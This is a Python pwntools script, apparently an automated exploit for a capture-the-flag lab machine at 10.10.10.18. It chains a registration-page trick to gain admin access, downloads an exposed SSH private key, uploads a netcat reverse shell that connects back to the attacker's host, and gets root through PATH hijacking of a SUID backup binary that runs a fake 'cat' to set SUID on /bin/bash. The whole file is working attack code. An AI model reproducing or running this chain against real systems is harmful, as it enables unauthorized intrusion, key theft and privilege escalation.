#!/usr/bin/python3

from pwn import * # pip3 install pwn
import requests

banner = """
                                                                                                               
@@@       @@@@@@  @@@@@@@@ @@@ @@@           @@@@@@  @@@  @@@ @@@@@@@  @@@@@@  @@@@@@@  @@@  @@@  @@@ @@@  @@@ 
@@!      @@!  @@@      @@! @@! !@@          @@!  @@@ @@!  @@@   @!!   @@!  @@@ @@!  @@@ @@!  @@!  @@! @@!@!@@@ 
@!!      @!@!@!@!    @!!    !@!@!  @!@!@!@! @!@!@!@! @!@  !@!   @!!   @!@  !@! @!@@!@!  @!!  !!@  @!@ @!@@!!@! 
!!:      !!:  !!!  !!:       !!:            !!:  !!! !!:  !!!   !!:   !!:  !!! !!:       !:  !!:  !!  !!:  !!! 
: ::.: :  :   : : :.::.: :   .:              :   : :  :.:: :     :     : :. :   :         ::.:  :::   ::    :  

                                                                
                                                                   by z3r0byte <3
"""

# ctrl + c 

def def_handler(sig, frame):

    print("\n[!] Saliendo...\n")
    os.system("rm cat revshell.sh id_rsa")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


# global variables

padding_oracle_url="http://10.10.10.18/register.php"

SSH_key_url="http://10.10.10.18/mysshkeywithnamemitsos"

# main

def main():
    
    print(banner)

    # padding oracle
    
    p1 = log.progress("Intrusión")
    p1.status("Explotando padding oracle attack")
    time.sleep(2)

    s = requests.session()

    data = {
        
        "username":"admin=",
        "password":"",
        "password_again":""

    }

    s.post(padding_oracle_url, data=data)

    # download ssh private key
    
    p1.status("Descargando clave id_rsa")
    time.sleep(2)

    r = s.get(SSH_key_url)

    open('id_rsa', 'wb').write(r.content)

    # archives to upload

    p1.status("Creando archivos maliciosos para subir a la máquina víctima")
    time.sleep(2)
    
    revsh = open('revshell.sh', 'w+')
    lhost = str(input("introduce tu LHOST: "))
    revsh.write("#!/bin/bash \n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+lhost.strip("\n")+" 4444 >/tmp/f")
    revsh.close()

    cat = open('cat', 'w+')
    cat.write("chmod u+s /bin/bash")
    cat.close()
    
    # ssh connect

    p1.status("Conectando a la máquina víctima por SSH")
    time.sleep(2)

    os.system("chmod 600 id_rsa")
    
    def SSH():

        shell = ssh('mitsos', '10.10.10.18', keyfile='./id_rsa')
        
        shell.upload(b"./revshell.sh", remote="/tmp/rev.sh")
        shell.upload(b"./cat", remote="/tmp/cat")
        term = shell.run(b"bash")
        term.sendline(b"bash /tmp/rev.sh")
        

    try:
        threading.Thread(target=SSH, args=()).start()
    except Exception as e:
        log.error(str(e))

    sh = listen(4444, timeout=120).wait_for_connection()
    if sh.sock is None:
        p1.failure("no se ha podido acceder a la máquina")
        sys.exit(1)
    else:
        p1.success()
        sh.sendline(b"export PATH=/tmp:$PATH;chmod +x /tmp/cat;/home/mitsos/backup &>/dev/null;sleep 1;bash -p")
        sh.sendline(b"rm /tmp/cat /tmp/rev.sh")
        sh.interactive()

if __name__ == '__main__':

    main()
